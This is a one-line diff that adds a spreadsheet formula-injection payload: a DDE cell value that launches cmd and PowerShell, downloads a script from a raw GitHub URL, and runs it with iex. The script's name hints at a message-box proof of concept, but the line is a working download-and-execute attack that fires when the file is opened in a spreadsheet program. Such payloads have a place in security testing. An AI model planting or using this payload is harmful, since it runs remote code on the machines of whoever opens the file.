@@ -1,0 +1,1 @@
+=cmd|' /c powershell -c "(new-object system.net.webclient).downloadstring(\"https://raw.githubusercontent.com/theMace/Notes/master/msgbox2.ps1\")|iex"'!A0
